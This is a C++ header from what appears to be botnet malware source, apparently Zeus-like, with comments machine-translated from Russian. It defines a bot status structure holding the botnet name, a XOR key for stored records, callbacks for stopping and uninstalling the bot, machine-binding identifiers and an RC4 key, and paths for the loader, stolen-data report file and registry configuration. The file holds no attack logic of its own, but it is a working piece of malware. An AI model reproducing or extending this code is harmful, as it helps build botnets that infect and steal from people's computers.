/*  Structure for information on the established paper.*/
#pragma once

#include "malwaretools.h"

namespace BotStatus
{
  //Data on aktvinom paper. Version 1, introduced with 1.4.0.0.
  typedef BOOL (WINAPI *callbackStopServices)(void *reserved);
  typedef BOOL (WINAPI *callbackUninstall)(void *reserved);

# pragma pack(push, 1)
  typedef struct
  {
    DWORD structSize;                   //The size of the structure.
    DWORD flags;                        //Not ispoluzetsya.
    DWORD version;                      //Version of the bot.
    WCHAR botnet[BOTNET_MAX_CHARS + 1]; //The name of a botnet.
    DWORD storageArrayKey;              //XOR key for storing records.
    
    callbackStopServices stopServices;  //Function to stop the services bot.
    callbackUninstall uninstall;        //Function to remove the bot.

    //Binding.
    DWORD reserved;       //Not used.
    WCHAR compId[60];     //CompID.
    GUID guid;            //Binary GUID association with the OS.
    Crypt::RC4KEY rc4Key; //Encryption key for the OS.

    //Data on the waterways.
    struct
    {
      WCHAR coreFile[MAX_PATH];         //Otnostileny path loader.
      WCHAR reportFile[MAX_PATH];       //Otnostileny way for the various data.
      WCHAR regKey[MAX_PATH];           //Otnostileny path in the registry.
      WCHAR regDynamicConfig[MAX_PATH]; //Zanchenie in the registry to store configuration.
      WCHAR regLocalConfig[MAX_PATH];   //Zanchenie in the registry to store the local configuration.
      WCHAR regLocalSettings[MAX_PATH]; //Zanchenie in the registry to store settings.
    }userPaths;          
  }VER1;
# pragma pack(pop)
};
